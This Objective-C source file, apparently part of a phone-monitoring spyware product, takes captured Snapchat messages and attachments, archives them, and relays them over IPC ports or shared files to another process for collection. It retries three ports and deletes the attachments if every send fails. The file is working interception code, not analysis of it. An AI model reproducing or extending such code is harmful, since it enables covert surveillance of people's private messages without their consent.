//
//  SnapchatEventSender.m
//  MSFSP
//
//  Created by benjawan tanarattanakorn on 3/13/2557 BE.
//
//

#import "SnapchatEventSender.h"

#import "FxIMEvent.h"
#import "FxAttachment.h"

#import "StringUtils.h"
#import "DefStd.h"

#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"

static SnapchatEventSender *_SnapchatEventSender = nil;


@interface SnapchatEventSender (private)
+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
@end



@implementation SnapchatEventSender


+ (id) sharedSnapchatEventSender {
    DLog(@"sharedSnapchatEventSender")
	if (_SnapchatEventSender == nil) {
		_SnapchatEventSender = [[SnapchatEventSender alloc] init];
        
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
            SharedFile2IPCSender *sharedFileSender  = nil;
            sharedFileSender                        = [[SharedFile2IPCSender alloc] initWithSharedFileName:kSnapchatMessagePort1];
            [_SnapchatEventSender setMIMSharedFileSender:sharedFileSender];
            [sharedFileSender release];
            sharedFileSender = nil;
        }
	}
	return (_SnapchatEventSender);
}

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
    
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully                            = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender  = [[SnapchatEventSender sharedSnapchatEventSender] mIMSharedFileSender];
        DLog(@"sharedFileSender %@", sharedFileSender)
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
        
        if (aIMEvent) {
            NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
            DLog(@"Snapchat message after remove emoji = %@", msg);
            
            if ([msg length] || [[aIMEvent mAttachments] count]) {
                [aIMEvent setMMessage:msg];
                
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
				[archiver encodeObject:aIMEvent forKey:kSnapchatArchived];
				[archiver finishEncoding];
				[archiver release];

                // -- first
                BOOL isSendingOK = [self sendDataToPort:data portName:kSnapchatMessagePort1];
                DLog (@"Sending to first port %d", isSendingOK)
                
                if (!isSendingOK) {
                    DLog (@"First sending Snapchat fail");
                    
                    // -- second
                    isSendingOK = [self sendDataToPort:data portName:kSnapchatMessagePort2];
                    
                    if (!isSendingOK) {
                        DLog (@"Second sending Snapchat also fail");
                        
                        // -- Third port ----------
                        [NSThread sleepForTimeInterval:3];
                        
                        isSendingOK = [self sendDataToPort:data portName:kSnapchatMessagePort3];
                        if (!isSendingOK) {
                            DLog (@"Third sending Snapchat also fail, so delete the attachment");
                            [SnapchatEventSender deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
                        }
                    }
                }
                [data release];
            }
            
        } // aIMEvent
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
	// delete the attachment files
	if (aAttachmentArray && [aAttachmentArray count] != 0) {
		for (FxAttachment *attachment in aAttachmentArray) {
			NSString *path = [attachment fullPath];
			DLog (@"deleting snapchat attachment file: %@", path)
			[[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		}
	}
}


@end
